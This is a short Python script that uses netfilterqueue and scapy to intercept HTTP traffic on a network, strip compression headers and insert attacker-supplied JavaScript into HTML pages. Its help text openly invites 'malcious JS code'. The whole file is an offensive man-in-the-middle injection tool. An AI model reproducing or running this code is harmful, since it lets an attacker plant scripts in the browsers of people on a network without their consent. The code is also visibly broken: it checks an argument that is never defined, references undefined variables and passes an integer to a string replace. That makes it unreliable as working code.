import netfilterqueue
import scapy.all as scapy
import re
import argparse

def arg_parse():
    parser = argparse.ArgumentParser()
    parser.add_argument("-c", "--code", dest="injection", help= "Put your malcious JS code :)")
    options = parser.parse_args()
    if not options.interface:
        parser.error("[-]Specify the code to inject")
    return options

def set_load(packet,load):
    scapy_packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].len
    del packet[scapy.TCP].chksum

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("http response")
            load = re.sub("Accept-Encoding:.*?\\r\\n","",load)

        elif scapy_packet[scapy.TCP].sport == 80:
            print("http response")
            if "Text/html" in load:
                injection_code = str(option.injection)
                load = load.replace("</body>",injection_code + "</body>")
                content_length_search = re.search("(?:Content-length:\s)(\d*)",load)
                if content_length_search:
                    content_length = content_length_search.group(1)
                    new_content_length= int(content_length) + len(injection_code)
                    load = load.replace(content_length,new_content_length)


        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


option = arg_parse()
queue = netfilterqueue.NetfilterQueue()
queue(0,process_packet)
queue.run()